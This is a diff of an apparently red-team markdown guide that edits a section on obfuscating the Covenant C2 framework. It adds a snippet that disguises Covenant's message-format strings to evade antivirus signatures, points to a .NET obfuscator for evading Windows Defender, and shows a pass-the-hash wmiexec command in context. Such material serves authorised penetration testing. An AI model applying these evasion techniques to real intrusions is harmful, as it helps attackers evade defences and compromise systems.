@@ -330,10 +330,10 @@ proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes 
 ```
 
 # Obfuscation
-
+	
 ### 1) Covenant modified dropper
 
-First of all we will clone the main Civenant repository into our local machine. Furthermore we will modifiy some of the default word used by Covenat 
+First of all we will clone the main Covenant repository into our local machine. Furthermore we will modifiy some of the default word used by Covenat 
 (Grunt, Jitter, Stage0, etc) in order to alter AV signature scanning capabilities. The bash script to automate this process is presented below:
 
 ```sh
@@ -482,7 +482,15 @@ dotnet run
 
 ```
 
-__Note:__ Please modify the script accordingly with your needs 🚩
+__Note:__ Please modify the script accordingly with your needs 🚩. 
+
+```cpp
+just another way to declare modified strings
+
+msgFormatString='string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";'
+newFormatString='string MessageFormat = @"{{""---G-U-I-----D"":""{0}"",""T----y-p-----e"":{1},""---M-e-t----a"":""{2}"",""---I---V---"":""{3}"",""---E--n---cry---pt-e-d-M-e---ss---a-g-e"":""{4}"",""---H-----M--A--C"":""{5}""}}".Replace("-","");'
+
+```
 
 The new Covenant instance will generate the default Grunt using the __Monk__ word. Is up to the user to change the default Covenant Listener Profile. 
 Once the modified C# Monkstager has been downloaded it is possible to add further obfuscation using a combination or both of the following tools: 
@@ -491,4 +499,6 @@ Once the modified C# Monkstager has been downloaded it is possible to add furthe
 
 
 - [NET-Obfuscate](https://github.com/BinaryScary/NET-Obfuscate) Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender
+
+
 
